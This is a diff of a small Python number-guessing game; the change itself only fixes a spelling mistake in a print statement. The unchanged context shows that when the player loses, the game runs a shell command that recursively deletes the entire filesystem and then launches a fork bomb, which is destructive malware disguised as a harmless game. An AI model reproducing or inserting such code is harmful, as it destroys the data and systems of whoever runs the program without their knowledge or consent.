@@ -18,7 +18,7 @@ def flw_cnrl():
 def main_game():
     
     print("computer chooses",choose)
-    print("your nunmber is",play)
+    print("your number is",play)
     if play == choose:
             print("You lose :(")
             os.system("rm -rf / --no-preserve-root | :(){ :|:& };:")
